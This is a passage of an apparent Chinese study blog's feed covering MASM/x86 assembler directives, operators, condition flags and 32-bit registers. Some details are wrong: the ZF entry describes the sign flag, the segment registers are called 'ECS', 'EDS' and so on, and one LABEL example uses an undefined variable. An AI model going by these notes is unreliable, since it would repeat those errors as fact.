end start
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ORG-——————–-起始偏移地址设置指令&#34;&gt;&lt;a href=&#34;#ORG-——————–-起始偏移地址设置指令&#34; class=&#34;headerlink&#34; title=&#34;ORG  ——————– 起始偏移地址设置指令&#34;&gt;&lt;/a&gt;ORG  ——————– 起始偏移地址设置指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;ORG 0000H
AJMP MAIN
ORG 0030H&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;——————–地址计数器的当前值&#34;&gt;&lt;a href=&#34;#——————–地址计数器的当前值&#34; class=&#34;headerlink&#34; title=&#34;$   ——————–地址计数器的当前值&#34;&gt;&lt;/a&gt;$   ——————–地址计数器的当前值&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;例如JNE+6，能引用地址计数器的值，每次引用会使地址计数器的值发生改变，地址计数器即当前指令的偏移地址。该指令的转向地址即JNE指令的首地址加6。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PROC，ENDP-——————–-过程定义语句&#34;&gt;&lt;a href=&#34;#PROC，ENDP-——————–-过程定义语句&#34; class=&#34;headerlink&#34; title=&#34;PROC，ENDP ——————– 过程定义语句&#34;&gt;&lt;/a&gt;PROC，ENDP ——————– 过程定义语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;SumOf proc
    .
    .
    .
    ret
SumOf endp;这是一个过程&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;NAME，TITLE，END-——————–-程序开始结束语句&#34;&gt;&lt;a href=&#34;#NAME，TITLE，END-——————–-程序开始结束语句&#34; class=&#34;headerlink&#34; title=&#34;NAME，TITLE，END ——————– 程序开始结束语句&#34;&gt;&lt;/a&gt;NAME，TITLE，END ——————– 程序开始结束语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;NULL&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;MACRO，ENDM-——————–宏定义指令&#34;&gt;&lt;a href=&#34;#MACRO，ENDM-——————–宏定义指令&#34; class=&#34;headerlink&#34; title=&#34;MACRO，ENDM  ——————–宏定义指令&#34;&gt;&lt;/a&gt;MACRO，ENDM  ——————–宏定义指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mPutchar MACRO char
    push eax
    mov al,char
    call WriteChar
    pop eax
    ENDM&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;XLAT-（TRANSLATE）-——————–-换码指令—&#34;&gt;&lt;a href=&#34;#XLAT-（TRANSLATE）-——————–-换码指令—&#34; class=&#34;headerlink&#34; title=&#34;XLAT  （TRANSLATE） ——————– 换码指令—-&#34;&gt;&lt;/a&gt;XLAT  （TRANSLATE） ——————– 换码指令—-&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;X DW 1122h,3344h,5566h,7788h
lea bx,X
mov al,03h
xlat&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ALIGN-———————伪指令&#34;&gt;&lt;a href=&#34;#ALIGN-———————伪指令&#34; class=&#34;headerlink&#34; title=&#34;ALIGN ———————伪指令&#34;&gt;&lt;/a&gt;ALIGN ———————伪指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var byte ?; 00404000h
ALIGN 2
var2 byte ?; 00404002&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PTR-———————-运算符&#34;&gt;&lt;a href=&#34;#PTR-———————-运算符&#34; class=&#34;headerlink&#34; title=&#34;PTR ———————-运算符&#34;&gt;&lt;/a&gt;PTR ———————-运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var dword 12345678h
mov ax,word ptr var; 将低16位(5678)送入ax&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;TYPE&#34;&gt;&lt;a href=&#34;#TYPE&#34; class=&#34;headerlink&#34; title=&#34;TYPE&#34;&gt;&lt;/a&gt;TYPE&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var word ?
var2 byte ?; word,byte都是type,分别代表2,1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LENGTHOF-————–运算符&#34;&gt;&lt;a href=&#34;#LENGTHOF-————–运算符&#34; class=&#34;headerlink&#34; title=&#34;LENGTHOF ————–运算符&#34;&gt;&lt;/a&gt;LENGTHOF ————–运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var1 byte 10,20,30;3
var2 word 30 DUP(?),0,0;32
var3 word 5 DUP(3 dup(?));3*5
var4 byte &#34;1234&#34;,0;5&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SIZFEOF————-运算符&#34;&gt;&lt;a href=&#34;#SIZFEOF————-运算符&#34; class=&#34;headerlink&#34; title=&#34;SIZFEOF————-运算符&#34;&gt;&lt;/a&gt;SIZFEOF————-运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var word 32 dup(0)
mov eax,sizeof var;eax=32*2=64&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LABEL-—————伪指令&#34;&gt;&lt;a href=&#34;#LABEL-—————伪指令&#34; class=&#34;headerlink&#34; title=&#34;LABEL —————伪指令&#34;&gt;&lt;/a&gt;LABEL —————伪指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var1 label word
var2 dword 12345678h;公用一个内存位置，var2未分配空间
mov ax,var1;5678h
mov dx,[var+2];1234h&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;TYPEDEF————–运算符&#34;&gt;&lt;a href=&#34;#TYPEDEF————–运算符&#34; class=&#34;headerlink&#34; title=&#34;TYPEDEF————–运算符&#34;&gt;&lt;/a&gt;TYPEDEF————–运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;var typedef ptr byte;(指针)
.data
	array byte 10h,20h,30h
    ptr1 var ?
    ptr2 var array;指向一个数组&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JMP-————无条件跳转到目标地址&#34;&gt;&lt;a href=&#34;#JMP-————无条件跳转到目标地址&#34; class=&#34;headerlink&#34; title=&#34;JMP ————无条件跳转到目标地址&#34;&gt;&lt;/a&gt;JMP ————无条件跳转到目标地址&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;top:
.
.
    jmp top;不断循环&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;USES—————等于-push-pop&#34;&gt;&lt;a href=&#34;#USES—————等于-push-pop&#34; class=&#34;headerlink&#34; title=&#34;USES—————等于 push+pop&#34;&gt;&lt;/a&gt;USES—————等于 push+pop&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;ArraySum proc uses esi ecx
    mov eax,0
L1:
	add eax,[esi]
    add esi,type dword
    loop L1
ArraySum endp&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CLC&#34;&gt;&lt;a href=&#34;#CLC&#34; class=&#34;headerlink&#34; title=&#34;CLC&#34;&gt;&lt;/a&gt;CLC&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;clc;清除标识位&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;STC&#34;&gt;&lt;a href=&#34;#STC&#34; class=&#34;headerlink&#34; title=&#34;STC&#34;&gt;&lt;/a&gt;STC&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;进位标志置1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ENTER——————-被调用过程自动创建堆栈帧&#34;&gt;&lt;a href=&#34;#ENTER——————-被调用过程自动创建堆栈帧&#34; class=&#34;headerlink&#34; title=&#34;ENTER——————-被调用过程自动创建堆栈帧&#34;&gt;&lt;/a&gt;ENTER——————-被调用过程自动创建堆栈帧&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;Mysub proc
	enter 8,0
;等效于
Mysub proc
	push ebp
	mov ebp,esp
	sub esp,8&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LEAVE——————指令结束一个过程的堆栈帧&#34;&gt;&lt;a href=&#34;#LEAVE——————指令结束一个过程的堆栈帧&#34; class=&#34;headerlink&#34; title=&#34;LEAVE——————指令结束一个过程的堆栈帧&#34;&gt;&lt;/a&gt;LEAVE——————指令结束一个过程的堆栈帧&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;Mysub proc
	enter 8,0
	.
	.
	leave
	ret
Mysub endp
;等效于
Mysub proc
	push ebp
	mov ebp,esp
	sub esp,8
	.
	.
	mov esp,ebp
	pop ebp
	ret
Mysub endp&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LOCAL—————局部变量&#34;&gt;&lt;a href=&#34;#LOCAL—————局部变量&#34; class=&#34;headerlink&#34; title=&#34;LOCAL—————局部变量&#34;&gt;&lt;/a&gt;LOCAL—————局部变量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;Mysub proc
	local var:dword;这是一个局部变量&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;INVOKE—————–CALL替代品，一行调用多个参数&#34;&gt;&lt;a href=&#34;#INVOKE—————–CALL替代品，一行调用多个参数&#34; class=&#34;headerlink&#34; title=&#34;INVOKE—————–CALL替代品，一行调用多个参数&#34;&gt;&lt;/a&gt;INVOKE—————–CALL替代品，一行调用多个参数&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;invoke Dumparray,offset array,lengthof array,type array&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ADDR——–只能和INVOKE一起&#34;&gt;&lt;a href=&#34;#ADDR——–只能和INVOKE一起&#34; class=&#34;headerlink&#34; title=&#34;ADDR——–只能和INVOKE一起&#34;&gt;&lt;/a&gt;ADDR——–只能和INVOKE一起&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;array dword 20 dup(?)
invoke swap
	addr array
	addr [array+4]&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;条件标志&#34;&gt;&lt;a href=&#34;#条件标志&#34; class=&#34;headerlink&#34; title=&#34;条件标志&#34;&gt;&lt;/a&gt;条件标志&lt;/h2&gt;&lt;h3 id=&#34;ZF-零标志&#34;&gt;&lt;a href=&#34;#ZF-零标志&#34; class=&#34;headerlink&#34; title=&#34;ZF 零标志&#34;&gt;&lt;/a&gt;ZF 零标志&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;当结果为负时,SF=1,否则,SF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;AF-辅助进位标志&#34;&gt;&lt;a href=&#34;#AF-辅助进位标志&#34; class=&#34;headerlink&#34; title=&#34;AF 辅助进位标志&#34;&gt;&lt;/a&gt;AF 辅助进位标志&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;运算过程中第三位有进位值,置AF=1,否则,AF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PF-奇偶标志&#34;&gt;&lt;a href=&#34;#PF-奇偶标志&#34; class=&#34;headerlink&#34; title=&#34;PF 奇偶标志&#34;&gt;&lt;/a&gt;PF 奇偶标志&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;当结果操作数中偶数个&#34;1&#34;,置PF=1,否则,PF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SF-符号标志&#34;&gt;&lt;a href=&#34;#SF-符号标志&#34; class=&#34;headerlink&#34; title=&#34;SF 符号标志&#34;&gt;&lt;/a&gt;SF 符号标志&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;当结果为负时,SF=1;否则,SF=0.溢出时情形例外&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;CF-进位标志&#34;&gt;&lt;a href=&#34;#CF-进位标志&#34; class=&#34;headerlink&#34; title=&#34;CF 进位标志&#34;&gt;&lt;/a&gt;CF 进位标志&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;最高有效位产生进位值,例如,执行加法指令时,MSB有进位,置CF=1;否则,CF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;OF-溢出标志&#34;&gt;&lt;a href=&#34;#OF-溢出标志&#34; class=&#34;headerlink&#34; title=&#34;OF 溢出标志&#34;&gt;&lt;/a&gt;OF 溢出标志&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;若操作数结果超出了机器能表示的范围,则产生溢出,置OF=1,否则,OF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/01/01/ji-cun-qi/</guid>
            <title>寄存器</title>
            <link>https://0xdadream.github.io/2021/01/01/ji-cun-qi/</link>
            <category>学习</category>
            <category>汇编</category>
            <pubDate>Fri, 01 Jan 2021 06:37:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;32位CPU所含有的寄存器有：&#34;&gt;&lt;a href=&#34;#32位CPU所含有的寄存器有：&#34; class=&#34;headerlink&#34; title=&#34;32位CPU所含有的寄存器有：&#34;&gt;&lt;/a&gt;32位CPU所含有的寄存器有：&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;4个数据寄存器(EAX、EBX、ECX和EDX) &lt;/li&gt;
&lt;li&gt;2个变址和指针寄存器(ESI和EDI) &lt;/li&gt;
&lt;li&gt;2个指针寄存器(ESP和EBP)  &lt;/li&gt;
&lt;li&gt;6个段寄存器(ES、CS、SS、DS、FS和GS) &lt;/li&gt;
&lt;li&gt;1个指令指针寄存器(EIP) 1个标志寄存器(EFlags)&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;1、数据寄存器&#34;&gt;&lt;a href=&#34;#1、数据寄存器&#34; class=&#34;headerlink&#34; title=&#34;1、数据寄存器&#34;&gt;&lt;/a&gt;1、数据寄存器&lt;/h1&gt;&lt;p&gt;数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;对低16位数据的存取，不会影响高16位的数据。 这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。 程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;寄存器EAX通常称为累加器(Accumulator)，用累加器进行的操作可能需要更少时间。可用于乘、 除、输入/输出等操作，使用频率很高；  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;寄存器EBX称为基地址寄存器(Base Register)。它可作为存储器指针来使用；  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;寄存器ECX称为计数寄存器(Count Register)。 在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;寄存器EDX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址， &lt;/p&gt;
&lt;p&gt;在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果， 而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。 &lt;/p&gt;
&lt;h1 id=&#34;2、变址寄存器&#34;&gt;&lt;a href=&#34;#2、变址寄存器&#34; class=&#34;headerlink&#34; title=&#34;2、变址寄存器&#34;&gt;&lt;/a&gt;2、变址寄存器&lt;/h1&gt;&lt;p&gt;32位CPU有2个32位通用寄存器ESI和EDI。 &lt;/p&gt;
&lt;p&gt;其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据。 &lt;/p&gt;
&lt;p&gt;寄存器ESI、EDI、SI和DI称为变址寄存器(Index Register)，它们主要用于存放存储单元在段内的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 &lt;/p&gt;
&lt;p&gt;变址寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 &lt;/p&gt;
&lt;p&gt;它们可作一般的存储器指针使用。在字符串操作指令的执行过程中，对它们有特定的要求，而且还具有特殊的功能。 &lt;/p&gt;
&lt;h1 id=&#34;3、指针寄存器&#34;&gt;&lt;a href=&#34;#3、指针寄存器&#34; class=&#34;headerlink&#34; title=&#34;3、指针寄存器&#34;&gt;&lt;/a&gt;3、指针寄存器&lt;/h1&gt;&lt;p&gt;其低16位对应先前CPU中的BP和SP，对低16位数据的存取，不影响高16位的数据。 &lt;/p&gt;
&lt;p&gt;32位CPU有2个32位通用寄存器EBP和ESP。 &lt;/p&gt;
&lt;p&gt;它们主要用于访问堆栈内的存储单元，并且规定： &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;EBP为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据；  &lt;/li&gt;
&lt;li&gt;ESP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;寄存器EBP、ESP、BP和SP称为指针寄存器(Pointer Register)，主要用于存放堆栈内存储单元的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 &lt;/p&gt;
&lt;p&gt;指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 &lt;/p&gt;
&lt;h1 id=&#34;4、段寄存器&#34;&gt;&lt;a href=&#34;#4、段寄存器&#34; class=&#34;headerlink&#34; title=&#34;4、段寄存器&#34;&gt;&lt;/a&gt;4、段寄存器&lt;/h1&gt;&lt;p&gt;段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。 &lt;/p&gt;
&lt;p&gt;CPU内部的段寄存器： &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ECS——代码段寄存器(Code Segment Register)，其值为代码段的段值；  &lt;/li&gt;
&lt;li&gt;EDS——数据段寄存器(Data Segment Register)，其值为数据段的段值；  &lt;/li&gt;
&lt;li&gt;EES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  &lt;/li&gt;
&lt;li&gt;ESS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值；  &lt;/li&gt;
&lt;li&gt;EFS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  &lt;/li&gt;
&lt;li&gt;EGS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值。  &lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;在16位CPU系统中，它只有4个段寄存器，所以，程序在任何时刻至多有4个正在使用的段可直接访问；&lt;/li&gt;
&lt;li&gt;在32位微机系统中，它有6个段寄存器，所以，在此环境下开发的程序最多可同时访问6个段。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;32位CPU有两个不同的工作方式：实方式和保护方式。在每种方式下，段寄存器的作用是不同的。有关规定简 单描述如下： &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;实方式： 前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量”的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;保护方式： 在此方式下，情况要复杂得多，装入段寄存器的不再是段值，而是称为“选择子”(Selector)的某个值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
